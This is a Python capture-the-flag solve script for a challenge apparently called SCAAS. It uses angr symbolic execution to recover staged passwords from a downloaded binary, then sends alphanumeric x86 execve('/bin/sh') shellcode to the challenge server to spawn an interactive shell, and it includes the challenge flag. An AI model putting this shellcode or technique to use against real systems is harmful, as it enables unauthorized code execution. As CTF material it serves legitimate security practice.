#!/usr/bin/env python3
import string
import subprocess

from pwn import *
import zlib
import angr
from angr.errors import SimUnsatError
from claripy import BVS
import struct


def connect():
    return remote("scaas-1.play.hfsc.tf", 1337)


def download_service(tube):
    tube.sendlineafter(b"\n > ", b"1")
    tube.recvuntil(b"Here is your SCAAS service: (")
    b64 = tube.recvuntil(b"\n)\n", drop=True)
    with open("service", "wb") as fp:
        fp.write(zlib.decompress(base64.b64decode(b64), 16 + zlib.MAX_WBITS))


def solve_service():
    base_addr = 0x400000
    password_i_addr = 0x500000
    password_addr = 0x600000
    ret_addr = 0x700000
    project = angr.Project("service")

    @project.hook(base_addr + 0x1305)
    def get_int(s):
        i = s.mem[password_i_addr].uint32_t.resolved
        print(f"get_int(): i = {i}")
        addr = password_addr + i * 4
        print(f"get_int(): addr = {addr}")
        s.regs.eax = s.mem[addr].uint32_t.resolved
        print(f"get_int() = {s.regs.eax}")
        s.mem[password_i_addr].uint32_t = s.mem[password_i_addr].uint32_t.resolved + 1
        s.regs.pc = s.mem[s.regs.esp].uint32_t.resolved
        s.regs.esp += 4

    def solve_stage(stage_addr):
        password = BVS("password", 160)
        state = project.factory.call_state(base_addr + stage_addr, ret_addr=ret_addr)
        state.memory.store(password_addr, password)
        state.mem[password_i_addr].uint32_t = 0
        simgr = project.factory.simgr(state)
        while True:
            simgr.explore(find=[ret_addr])
            for found in simgr.stashes["found"]:
                print(found.regs.eax)
                try:
                    return found.solver.eval(
                        password, cast_to=bytes, extra_constraints=[found.regs.eax == 1]
                    )
                except SimUnsatError:
                    continue

    results = []
    for stage_addr in (0x13F6, 0x14A0, 0x158A):
        password_bytes = solve_stage(stage_addr)
        password_ints = struct.unpack("<IIIII", password_bytes)
        print([hex(x) for x in password_ints])
        results.extend(password_ints)
    return results


def make_shellcode():
    # https://packetstormsecurity.com/files/155844/Linux-x86-Execve-Alphanumeric-Shellcode.html
    shellcode_src = r""".intel_syntax noprefix
.globl _start
_start:

push eax
pop ecx                      /* ecx = _start */

push 0x30
pop eax
xor al, 0x30
push eax
pop edx                      /* edx=0 (const) */

push edx
pop eax
dec eax                      /* ax = 0xffff */
xor ax, 0x4f73               /* ax = 0xb08c */

push ecx                     /* eax=ecx=_start */
push ecx                     /* ecx=ecx (nop) */
push edx                     /* edx=edx (nop) */
push ebx                     /* ebx=ebx (nop) */
push 0x30                    /* SDM: Skip next 4 bytes of stack */
push ebp                     /* ebp=ebp (nop) */
push eax                     /* esi=eax=0xb08c */
push edi                     /* edi=edi (nop) */
popad                        /* ^^^^^^^^^^^^^ */

xor al, 0x45                 /* eax += 0x45 (it ends with 0x000) */
xor dword ptr [eax], esi     /* _0x45 -> (0x41, 0x30) ^ (0x8c 0xb0)
                                         (0xcd, 0x80)
                                         int 0x80 */

push edx                     /* esp -> b'\0' */
push 0x68735858
pop eax                      /* eax=0x68735858 */
xor ax, 0x7777               /* eax=b'//sh' */
push eax                     /* esp -> b'//sh\0' */
push 0x30
pop eax                      /* eax=0x30 */
xor al, 0x30                 /* eax=0 */
xor eax, 0x6e696230          /* eax=b'0bin' */
dec eax                      /* eax=b'/bin' */
push eax                     /* esp -> b'/bin//sh\0' */

push esp
pop eax                      /* eax -> b'/bin//sh\0' */

push edx                     /* eax=edx=0 */
push edx                     /* ecx=edx=0 (argv) */
push edx                     /* edx=edx=0 (envp) */
push eax                     /* ebx=eax -> b'/bin/sh\0' (pathname) */
push edx                     /* SDM: Skip next 4 bytes of stack */
push ebp                     /* ebp=ebp (nop) */
push esi                     /* esi=esi (nop) */
push edi                     /* edi=edi (nop) */
popad                        /* ^^^^^^^^^^^^^ */

xor al, 0x4a
xor al, 0x41                 /* eax = __NR_execve = 0xb */

_0x45: .byte 0x41, 0x30
"""
    with open("shellcode.s", "w") as fp:
        fp.write(shellcode_src)
    subprocess.check_call(
        ["gcc", "-nostartfiles", "-nodefaultlibs", "-static", "-m32", "-g", "shellcode.s"]
    )
    # debug with:
    # gdb -ex 'b _start' -ex 'layout asm' -ex 'set pagination off' -ex 'r' -ex 'set $eax=_start' --args ./a.out
    return asm(shellcode_src, arch="i386")


def main():
    shellcode = make_shellcode()
    with connect() as tube:
        download_service(tube)
        password = solve_service()
        tube.sendlineafter(b"\n > ", b"2")
        for element in password:
            tube.sendlineafter(b"Enter password ", hex(element).encode())
        # https://packetstormsecurity.com/files/155844/Linux-x86-Execve-Alphanumeric-Shellcode.html
        tube.sendlineafter(b"Run SCAAS ", shellcode)
        tube.interactive()
        # midnight{m0d3rn_cl0ud_sh3llc0de5}


if __name__ == "__main__":
    main()
